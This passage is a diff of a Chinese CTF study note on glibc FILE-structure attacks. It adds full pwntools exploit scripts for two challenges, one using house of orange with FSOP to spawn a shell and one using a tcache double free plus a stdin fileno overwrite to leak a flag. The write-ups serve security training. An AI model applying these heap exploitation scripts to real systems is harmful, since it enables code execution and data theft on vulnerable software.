@@ -71,7 +71,9 @@ _IO_2_1_stdin_
 
 ![image-20201210083345062](https://gitee.com/mrskye/Picbed/raw/master/img/20201210083345.png)
 
-进程中的 FILE 结构会通过 \_chain 域彼此连接形成一个链表（上图可见指向 \_IO_2_1_strout ），**链表头部用全局变量 \_IO_list_all 表示**，通过这个值我们可以遍历所有的 FILE 结构（FSOP 攻击利用到这个特性）。
+进程中的 FILE 结构会通过 \_chain 域彼此连接形成一个链表（上图可见指向 \_IO_2_1_stdout ），**链表头部用全局变量 \_IO_list_all 表示**，通过这个值我们可以遍历所有的 FILE 结构（FSOP 攻击利用到这个特性）。
+
+**_fileno** 是当前文件流的文件描述符，上图是 stderr 对应就是 2 。
 
 ### _IO_FILE_plus 结构
 
@@ -1408,6 +1410,458 @@ p.interactive()
 * [ctf-HITCON-2016-houseoforange学习](https://www.cnblogs.com/shangye/p/6268981.html)
 * [houseoforange_hitcon_2016（House of orange， unsorted bin attack，FSOP）](https://blog.csdn.net/weixin_44145820/article/details/105270036)
 * [house_of_orange](https://www.jianshu.com/p/1e45b785efc1)
+
+### 2020\_纵横杯\_wind_farm_panel
+
+#### 基本情况
+
+十分明显的堆溢出：
+
+```c
+int __fastcall edit(__int64 a1, __int64 a2)
+{
+  int v3; // [rsp+8h] [rbp-8h]
+
+  printf("Please modify your personal information.\nWhich turbine: ");
+  v3 = read_int("Please modify your personal information.\nWhich turbine: ", a2);
+  if ( !*((_QWORD *)&area + v3) || v3 < 0 || v3 > 4 )
+    return puts("Unvalidated Input");
+  printf("Please input: ");
+  read(0, *((void **)&area + v3), 0x1000uLL);   // 堆溢出
+  return puts("Done");
+}
+```
+
+#### 思路
+
+满足 ``house_of_orange`` 的条件：堆溢出能修改 topchunk size ；申请 size 限制范围大；没有 free 功能。
+
+1. 溢出修改 topchunk size ，申请大于 topchunk 的堆，将 topchunk 放入 unsortedbin ，然后泄露 libc 地址
+2. 修复 chunk_size&pre_size ，申请 larginbin 泄露 heap_addr
+3. FSOP
+
+```python
+# overwrite topchunk size
+add(0,0x88,'a'*0x88+p64(0xf71))
+# frow topchunk into unsortedbin
+add(1,0xfff,'b')
+
+#leak libc
+edit(0,'a'*0x90)
+show(0)
+p.recvuntil('a'*0x90)
+libc_base = u64(p.recv(6).ljust(8,'\x00'))-88-0x3c4b20
+log.info("libc_base:"+hex(libc_base))
+```
+
+申请 larginbin 之前，需要修复泄露 libc 破坏的 chunk_szie ，以后布置 prev_size ：
+
+```python
+# repair chunk_size&prev_size
+payload = 'a'*0x88+p64(0xf71)+p64(libc_base+88+0x3c4b20)*2
+payload += 'a'*0xf50+p64(0xf70)
+edit(0,payload)
+p.recvuntil("Done")
+
+# larginbin leak heap addr
+add(2,0x450,'c')
+edit(0,'a'*0xa0)
+show(2)
+gdb.attach(p)
+p.recvuntil('a'*0x10)
+heap_base = u64(p.recv(6).ljust(8,'\x00'))-0x90
+log.info("heap_base:"+hex(heap_base))
+```
+
+#### EXP
+
+```python
+from pwn import *
+context(log_level='debug')
+
+# p = remote("182.92.203.154",28452)
+# libc = ELF("./libc-2.23.so")
+
+p = process("./pwn")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+elf = ELF("./pwn")
+
+def command(id):
+	p.recvuntil(">> ")
+	p.sendline(str(id))
+def add(id,size,content):
+	command(1)
+	p.recvuntil(": ")
+	p.sendline(str(id))
+	p.recvuntil(": ")
+	p.sendline(str(size))
+	p.recvuntil(": ")
+	p.send(content)
+def show(id):
+	command(2)
+	p.recvuntil(": ")
+	p.sendline(str(id))
+def edit(id,content):
+	command(3)
+	p.recvuntil(": ")
+	p.sendline(str(id))
+	p.recvuntil(": ")
+	p.send(content)
+
+# overwrite topchunk size
+add(0,0x88,'a'*0x88+p64(0xf71))
+# frow topchunk into unsortedbin
+add(1,0xfff,'b')
+
+#leak libc
+edit(0,'a'*0x90)
+show(0)
+p.recvuntil('a'*0x90)
+libc_base = u64(p.recv(6).ljust(8,'\x00'))-88-0x3c4b20
+log.info("libc_base:"+hex(libc_base))
+
+# repair chunk_size&prev_size
+payload = 'a'*0x88+p64(0xf71)+p64(libc_base+88+0x3c4b20)*2
+payload += 'a'*0xf50+p64(0xf70)
+edit(0,payload)
+p.recvuntil("Done")
+
+# larginbin leak heap addr
+add(2,0x450,'c')
+edit(0,'a'*0xa0)
+show(2)
+gdb.attach(p)
+p.recvuntil('a'*0x10)
+heap_base = u64(p.recv(6).ljust(8,'\x00'))-0x90
+log.info("heap_base:"+hex(heap_base))
+edit(0,'a'*0x88+p64(0x461))
+
+IO_list_all=libc_base+libc.sym['_IO_list_all']
+log.info("IO_list_all:"+hex(IO_list_all))
+system=libc_base+libc.sym['system']
+
+# FSOP
+# set fake struct
+#payload='a'*0x450+p64(0)+p64(0x21)+p64(0x0000ddaa00000003)+p64(0)
+payload = 'b'*0x450
+fake = '/bin/sh\x00'+p64(0x61)
+fake += p64(0)+p64(IO_list_all-0x10)
+fake += p64(0) + p64(1)
+fake = fake.ljust(0xc0,'\x00')
+fake += p64(0) * 3
+fake += p64(heap_base+0x5c8) # vtable
+fake += p64(0) * 2
+fake += p64(system)
+payload += fake
+
+# payload = 'b'*0x458+p64(0x60)
+edit(2,payload)
+
+#gdb.attach(p,'b *$rebase(0xc2e)')
+
+command(1)
+p.recvuntil(": ")
+p.sendline(str(3))
+p.recvuntil(": ")
+p.sendline(str(0x80))
+
+p.interactive()
+```
+
+## 劫持 fileno 控制文件流
+
+先来了解一下 linux 的 file 文件结构，fileno 等概念。
+
+### _IO_FILE 结构
+
+FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：**stdin、stdout、stderr，分别对应文件描述符：0、1、2**。后续再打开文件对应的文件描述符就从 3 开始，当然可以用 dup2 修改。
+
+**每个文件流都有自己的 FILE 结构体**。结构体内容如下：
+
+```c
+struct _IO_FILE {
+  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
+#define _IO_file_flags _flags
+
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  char* _IO_read_ptr;   /* Current read pointer */
+  char* _IO_read_end;   /* End of get area. */
+  char* _IO_read_base;  /* Start of putback+get area. */
+  char* _IO_write_base; /* Start of put area. */
+  char* _IO_write_ptr;  /* Current put pointer. */
+  char* _IO_write_end;  /* End of put area. */
+  char* _IO_buf_base;   /* Start of reserve area. */
+  char* _IO_buf_end;    /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+  struct _IO_marker *_markers;
+
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+#if 0
+  int _blksize;
+#else
+  int _flags2;
+#endif
+  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
+
+#define __HAVE_COLUMN /* temporary */
+  /* 1+column number of pbase(); 0 is unknown. */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+
+  /*  char* _save_gptr;  char* _save_egptr; */
+
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+```
+
+在 ida 中搜索 ``_IO_2_1_stdxxx_`` 或者 ``stdxx`` 可以找到默认打开的三个文件描述符 FILE 结构体存储地址：
+
+![image-20201210083553060](https://gitee.com/mrskye/Picbed/raw/master/img/20210126231723.png)
+
+ gdb 调试中查看结构体内容：
+
+![image-20201210083345062](https://gitee.com/mrskye/Picbed/raw/master/img/20210126231706.png)
+
+**_fileno** 是当前文件流的文件描述符，上图是 stderr 对应就是 2 。
+
+我们知道 stdin 文件描述符是 0 ，如果我们将 stdin 的 fileno 修改为 2 ，那么 stdin 就变成了 stderr 。
+
+### 实战练习
+
+#### 基本情况
+
+原题环境是在 ubuntu18.04 旧版本 glibc ，也就是允许 tcache doublefree ，注意检查 glibc 版本。
+
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+在初始化函数中，打开 flag 的文件流，紧接着用 dup2 将原本文件描述符从 3 修改为 666 。
+
+```c
+unsigned __int64 init()
+{
+……
+  fd = open("flag", 0);
+  if ( fd == -1 )
+  {
+    puts("no such file :flag");
+    exit(-1);
+  }
+  dup2(fd, 666);                                // 改变文件描述符
+  close(fd);
+……
+}
+```
+
+堆申请有两种大小：0x20、0x30 ，数量没有限制。结构体如下：
+
+```c
+struct int{
+  int num;
+  int num;
+}
+struct short_int{
+ 	short num;
+  short num;
+}
+```
+
+free 堆后没有将指针指令，造成 UAF 漏洞，还有一点就是 doublefree 需要处理 bool 这个全局变量：
+
+```c
+unsigned __int64 delete()
+{
+……
+  if ( bool )
+  {
+    printf("TYPE:\n1: int\n2: short int\n>");
+    v1 = get_atoi();
+    if ( v1 == 1 && int_pt )
+    {
+      free(int_pt);
+      bool = 0;
+      puts("remove success !");                 // UAF
+    }
+    if ( v1 == 2 && short_pt )
+    {
+      free(short_pt);
+      bool = 0;
+      puts("remove success !");
+    }
+……
+}
+```
+
+show 函数限制使用 3 次，还需要注意输出长度问题，也就是用于泄露地址时并不是完整的地址：
+
+```c
+unsigned __int64 show()
+{
+……
+  if ( show_time-- )//show_time=3
+……
+}
+```
+
+exit 函数有一段输出功能：
+
+```c
+void __noreturn bye_bye()
+{
+  ……
+  __isoc99_scanf("%99s", v0);
+  ……
+}
+```
+
+#### 思路
+
+利用 exit 时 scanf 输出函数，就 stdin 的文件描述符修改为 666 ，那么输出就变成输出，将 flag 内容给输出出来。
+
+double free tcache 泄露堆地址：
+
+```python
+# leak heap address
+add(1,0x30)
+delete(1)
+add(2,0x20)
+delete(2)
+add(1,0x30)
+delete(2)
+heap_base = show(2)-0x290
+log.info("heap_base:"+hex(heap_base))
+```
+
+修改 chunk0 size ：
+
+```python
+# house of spirt
+add(2, heap_base+0x250)
+add(2, heap_base+0x250)
+# overwrite chunk0 size to 0x91
+add(2, 0x91)
+```
+
+多次释放 chunk0 最后放入 unsortedbin 泄露 libc 地址：
+
+```python
+# leak libc address
+# double free chunk0 into unsortedbin 
+for i in range(0, 7):
+    delete(1)
+    add(2, 0x20)
+delete(1)
+ 
+leak_addr = show(1) - 96
+libc_base = leak_addr - libc.sym['__malloc_hook'] - 0x10
+```
+
+修改 stdin 的 fileno 为 666 ：
+
+```python
+# write tcache fd 
+add(1, stdin_fileno)
+
+# house of sprit
+add(1, 0x30) 
+delete(1)
+add(2, 0x20)
+delete(1)
+heap_base = show(1) - 0x290
+log.info("heap_base:"+hex(heap_base))
+add(1, heap_base+0x260)
+add(1, heap_base+0x260)
+add(1, 231)
+add(1, 666)
+```
+
+#### EXP
+
+```python
+from pwn import *
+context(binary="./ciscn_final_2",log_level='debug')
+p = process("./ciscn_final_2", env={"LD_PRELOAD":"libc-2.27.so"})
+elf = ELF("./ciscn_final_2")
+libc = ELF("libc-2.27.so")
+
+def add(type, num):
+    p.sendlineafter('> ', '1')
+    p.sendlineafter('>', str(type))
+    p.sendafter(':', str(num))
+ 
+def delete(type):
+    p.sendlineafter('> ', '2')
+    p.sendlineafter('>', str(type))
+ 
+def show(type):
+    p.sendlineafter('> ', '3')
+    p.sendlineafter('>', str(type))
+    if type == 1:
+        p.recvuntil(':')
+    elif type == 2:
+        p.recvuntil(':')
+    return int(p.recvuntil('\n', drop=True))
+ 
+# leak heap address
+add(1,0x30)
+delete(1)
+add(2,0x20)
+delete(2)
+add(1,0x30)
+delete(2)
+heap_base = show(2)-0x290
+log.info("heap_base:"+hex(heap_base))
+
+# house of spirt
+add(2, heap_base+0x250)
+add(2, heap_base+0x250)
+# overwrite chunk0 size to 0x91
+add(2, 0x91)
+
+# leak libc address
+# double free chunk0 into unsortedbin 
+for i in range(0, 7):
+    delete(1)
+    add(2, 0x20)
+delete(1)
+ 
+leak_addr = show(1) - 96
+libc_base = leak_addr - libc.sym['__malloc_hook'] - 0x10
+log.info("libc_base:"+hex(libc_base))
+stdin_fileno = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x70
+log.info("stdin_fileno:"+hex(stdin_fileno))
+ 
+# write tcache fd 
+add(1, stdin_fileno)
+
+# house of sprit
+add(1, 0x30) 
+delete(1)
+add(2, 0x20)
+delete(1)
+heap_base = show(1) - 0x290
+log.info("heap_base:"+hex(heap_base))
+add(1, heap_base+0x260)
+add(1, heap_base+0x260)
+add(1, 231)
+add(1, 666)
+ 
+p.sendlineafter('> ', '4')
+
+p.interactive()
+```
 
 ## 参考文章
 
